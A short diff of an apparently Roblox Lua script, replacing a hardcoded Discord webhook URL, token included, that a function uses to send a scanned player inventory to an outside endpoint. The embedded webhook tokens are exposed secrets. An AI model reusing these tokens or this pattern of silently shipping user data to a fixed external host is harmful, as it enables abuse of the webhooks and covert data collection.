@@ -358,7 +358,7 @@ local function scanFullInventory()
 end
 
 local function scanInventoryAndSendToWebhook()
-    if not _G.webhook or _G.webhook == "https://discord.com/api/webhooks/1464672763280363745/5PFRx8Z9rJFfxOfPOz_eZ4pb6CtUeNUztzdU-ghGedDoPzvI65arlTjEQD4jTzXJjf2Za" then
+    if not _G.webhook or _G.webhook == "https://discord.com/api/webhooks/1464809056278417626/GGrCbw-sz4zl-Q6COMbWEkUn5Z-4kdFfBVc8fNEgwE0YNaFUYy2fLo2xy385H5s-4s9y" then
         warn("Webhook not set! Please set _G.webhook variable.")
         return false
     end
@@ -505,7 +505,7 @@ local function scanInventoryAndSendToWebhook()
     end
 end
 
-_G.webhook = "https://discord.com/api/webhooks/1464672763280363745/5PFRx8Z9rJFfxOfPOz_eZ4pb6CtUeNUztzdU-ghGedDoPzvI65arlTjEQD4jTzXJjf2Za"
+_G.webhook = "https://discord.com/api/webhooks/1464809056278417626/GGrCbw-sz4zl-Q6COMbWEkUn5Z-4kdFfBVc8fNEgwE0YNaFUYy2fLo2xy385H5s-4s9y"
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
